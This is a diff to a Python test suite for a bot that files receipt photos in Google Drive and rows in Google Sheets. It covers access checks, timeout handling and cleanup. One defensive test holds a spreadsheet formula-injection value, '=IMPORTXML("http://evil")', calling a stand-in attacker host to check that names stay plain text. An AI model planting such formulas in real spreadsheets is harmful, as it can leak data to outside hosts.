@@ -33,7 +33,7 @@ def store(files, handler) -> GoogleStore:
     s._owner_token, s._owner_expires = "", 0.0
     s._sheet_id, s._folder_id = "SHEET", "FOLDER"
     s._http = httpx.AsyncClient(transport=httpx.MockTransport(handler))
-    s._permissions, s._permissions_at, s._header_ok = [], 0.0, False
+    s._permissions, s._permissions_at, s._header_ok = [], float("-inf"), False
 
     async def sa_headers():
         return {"Authorization": "Bearer sa"}
@@ -41,7 +41,7 @@ def store(files, handler) -> GoogleStore:
     return s
 
 
-ROW = ReceiptRow("2026-09-25 16:00", "2026-09-24", "Denys (@zonda)", "d@gmail.com", 477.42, "UAH", False)
+ROW = ReceiptRow("rid1", "2026-09-25 16:00", "2026-09-24", "Denys (@zonda)", "d@gmail.com", 477.42, "UAH", False)
 
 
 # --- login ---
@@ -136,10 +136,11 @@ def test_permissions_are_cached_for_an_album(files):
     asyncio.run(scenario())
 
 
-def test_anyone_with_link_can_edit_means_access(files):
+def test_anyone_with_link_does_not_count(files):
+    # бот публічний: "будь-хто з посиланням" пустило б будь-який Google-акаунт
     async def scenario():
         s = store(files, lambda r: httpx.Response(200, json={"permissions": [{"role": "writer", "type": "anyone"}]}))
-        assert await s.has_access("whoever@gmail.com")
+        assert not await s.has_access("whoever@gmail.com")
 
     asyncio.run(scenario())
 
@@ -157,17 +158,20 @@ def google_ok(log, sheet_fails=False, header=None):
             body = request.read()
             assert b'"parents": ["FOLDER"]' in body and b"JPEGDATA" in body
             return httpx.Response(200, json={"id": "F1", "webViewLink": "https://drive/F1"})
-        if path.endswith("/values/A1:H1") and request.method == "GET":
+        if path.endswith("/values/A1:I1") and request.method == "GET":
             return httpx.Response(200, json={"values": header} if header else {})
-        if path.endswith("/values/A1:H1") and request.method == "PUT":
+        if path.endswith("/values/A1:I1") and request.method == "PUT":
             return httpx.Response(200, json={})
         if path.endswith("/values/A1:append"):
             assert request.headers["Authorization"] == "Bearer sa"
             assert request.url.params["valueInputOption"] == "RAW"
             if sheet_fails:
                 return httpx.Response(503, json={"error": {"status": "UNAVAILABLE"}})
-            assert json.loads(request.read())["values"][0][6] == "https://drive/F1"
+            cells = json.loads(request.read())["values"][0]
+            assert cells[6] == "https://drive/F1" and cells[8] == "rid1"
             return httpx.Response(200, json={})
+        if path.endswith("/values/I:I"):
+            return httpx.Response(200, json={"values": [["ID"]]})  # 503 на append -> шукаємо рядок, його нема
         if request.method == "DELETE" and path == "/drive/v3/files/F1":
             return httpx.Response(204)
         raise AssertionError((request.method, path))
@@ -184,7 +188,7 @@ def test_receipt_goes_to_drive_then_sheets(files):
     asyncio.run(scenario())
     order = [p for _, p in log]
     assert order.index("/upload/drive/v3/files") < order.index("/v4/spreadsheets/SHEET/values/A1:append")
-    assert ("PUT", "/v4/spreadsheets/SHEET/values/A1:H1") in log  # порожня таблиця -> заголовок
+    assert ("PUT", "/v4/spreadsheets/SHEET/values/A1:I1") in log  # порожня таблиця -> заголовок
 
 
 def test_header_is_not_rewritten(files):
@@ -194,7 +198,7 @@ def test_header_is_not_rewritten(files):
         await store(files, google_ok(log, header=[["Додано"]])).save_receipt(b"JPEGDATA", "image/jpeg", "r.jpg", ROW)
 
     asyncio.run(scenario())
-    assert ("PUT", "/v4/spreadsheets/SHEET/values/A1:H1") not in log
+    assert ("PUT", "/v4/spreadsheets/SHEET/values/A1:I1") not in log
 
 
 def test_sheet_failure_removes_the_photo(files):
@@ -227,7 +231,7 @@ def test_drive_failure_writes_nothing(files):
 
 
 def test_formula_like_name_stays_text():
-    row = ReceiptRow("t", "", '=IMPORTXML("http://evil")', "e@x", 1.0, "UAH", True)
+    row = ReceiptRow("id", "t", "", '=IMPORTXML("http://evil")', "e@x", 1.0, "UAH", True)
     assert row.cells("link")[2] == '=IMPORTXML("http://evil")'  # а RAW у запиті не дає Sheets її виконати
 
 
@@ -242,3 +246,117 @@ def test_users_link_relink_unlink(tmp_path):
     users.unlink(1)
     assert users.email(1) is None
     users.close()
+
+
+# --- знахідки ревю f93b051 ---
+
+def unsure_append(log, row_there=None, lookup_fails=False):
+    def handler(request):
+        log.append((request.method, request.url.path))
+        path = request.url.path
+        if path == "/token":
+            return httpx.Response(200, json={"access_token": "owner", "expires_in": 3600})
+        if path == "/upload/drive/v3/files":
+            return httpx.Response(200, json={"id": "F1", "webViewLink": "https://drive/F1"})
+        if path.endswith("/values/A1:I1"):
+            return httpx.Response(200, json={"values": [["Додано"]]})
+        if path.endswith("/values/A1:append"):
+            raise httpx.ReadTimeout("slow")  # Google міг записати, але відповідь не дійшла
+        if path.endswith("/values/I:I"):
+            if lookup_fails:
+                return httpx.Response(503, json={"error": {"status": "UNAVAILABLE"}})
+            return httpx.Response(200, json={"values": [["ID"], ["rid1"]] if row_there else [["ID"]]})
+        if request.method == "DELETE":
+            return httpx.Response(204)
+        raise AssertionError((request.method, path))
+    return handler
+
+
+def test_timeout_but_row_saved_is_success(files):
+    log = []
+
+    async def scenario():
+        assert await store(files, unsure_append(log, row_there=True)).save_receipt(
+            b"JPEGDATA", "image/jpeg", "r.jpg", ROW) == "https://drive/F1"
+
+    asyncio.run(scenario())
+    assert not any(m == "DELETE" for m, _ in log)  # фото лишилось: рядок на нього посилається
+
+
+def test_timeout_and_no_row_removes_photo(files):
+    log = []
+
+    async def scenario():
+        with pytest.raises(GoogleError):
+            await store(files, unsure_append(log, row_there=False)).save_receipt(b"JPEGDATA", "image/jpeg", "r.jpg", ROW)
+
+    asyncio.run(scenario())
+    assert ("DELETE", "/drive/v3/files/F1") in log
+
+
+def test_timeout_and_unknown_keeps_photo(files):
+    log = []
+
+    async def scenario():
+        with pytest.raises(g.GoogleUnsure):
+            await store(files, unsure_append(log, lookup_fails=True)).save_receipt(b"JPEGDATA", "image/jpeg", "r.jpg", ROW)
+
+    asyncio.run(scenario())
+    assert not any(m == "DELETE" for m, _ in log)  # не знаємо, чи є рядок, — фото не видаляємо
+
+
+def test_non_json_reply_still_cleans_up(files):
+    log = []
+
+    def handler(request):
+        log.append((request.method, request.url.path))
+        if request.url.path == "/token":
+            return httpx.Response(200, json={"access_token": "owner", "expires_in": 3600})
+        if request.url.path == "/upload/drive/v3/files":
+            return httpx.Response(200, json={"id": "F1", "webViewLink": "https://drive/F1"})
+        if request.method == "DELETE":
+            return httpx.Response(204)
+        return httpx.Response(200, text="<html>proxy error</html>")
+
+    async def scenario():
+        with pytest.raises(GoogleError):
+            await store(files, handler).save_receipt(b"JPEGDATA", "image/jpeg", "r.jpg", ROW)
+
+    asyncio.run(scenario())
+    assert ("DELETE", "/drive/v3/files/F1") in log
+
+
+def test_first_check_right_after_boot_asks_google(files, monkeypatch):
+    monkeypatch.setattr(g.time, "monotonic", lambda: 5.0)  # VM щойно завантажилась
+
+    async def scenario():
+        s = store(files, lambda r: httpx.Response(200, json=PERMS))
+        assert await s.has_access("by@trustee.io")
+
+    asyncio.run(scenario())
+
+
+def test_google_error_text_has_no_message_details():
+    async def scenario():
+        http = httpx.AsyncClient(transport=httpx.MockTransport(lambda r: httpx.Response(
+            404, json={"error": {"status": "NOT_FOUND", "message": "File not found: SECRET_SHEET_ID"}})))
+        with pytest.raises(GoogleError) as err:
+            await g._call(http, "permissions.list", "GET", "https://x")
+        assert "SECRET_SHEET_ID" not in str(err.value) and "NOT_FOUND" in str(err.value)
+
+    asyncio.run(scenario())
+
+
+def test_device_polling_survives_a_5xx(files):
+    answers = iter([httpx.Response(503), httpx.Response(200, json={"access_token": "at"})])
+
+    def handler(request):
+        if request.url.path == "/token":
+            return next(answers)
+        return httpx.Response(200, json={"email": "d@gmail.com", "email_verified": True})
+
+    async def scenario():
+        login = GoogleLogin(files[0], httpx.AsyncClient(transport=httpx.MockTransport(handler)))
+        assert await login.wait_for_email(g.DeviceCode("dc", "X", "u", 1800, 5)) == "d@gmail.com"
+
+    asyncio.run(scenario())
